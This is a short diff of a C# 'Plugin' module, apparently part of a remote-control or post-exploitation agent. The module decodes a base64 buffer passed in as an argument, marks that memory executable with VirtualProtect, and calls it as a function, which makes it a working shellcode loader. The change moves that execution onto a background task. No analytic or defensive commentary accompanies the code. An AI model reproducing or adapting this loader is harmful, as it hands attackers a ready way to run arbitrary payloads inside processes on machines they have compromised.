@@ -34,17 +34,19 @@ namespace Plugin
             {
                 buffer = Convert.FromBase64String(args["buffer"].ToString());
             }
-            
-            unsafe
+            Task.Run(() =>
             {
-                fixed (byte* ptr = buffer)
+                unsafe
                 {
-                    IntPtr pAddr = (IntPtr)ptr;
-                    VirtualProtect(pAddr, (UIntPtr)buffer.Length, MemoryProtection.PAGE_EXECUTE_READ, out MemoryProtection lpfOldProtect);
-                    BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate));
-                    f();
+                    fixed (byte* ptr = buffer)
+                    {
+                        IntPtr pAddr = (IntPtr)ptr;
+                        VirtualProtect(pAddr, (UIntPtr)buffer.Length, MemoryProtection.PAGE_EXECUTE_READ, out MemoryProtection lpfOldProtect);
+                        BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate));
+                        f();
+                    }
                 }
-            }
+            });
 
             return new ResponseResult()
             {
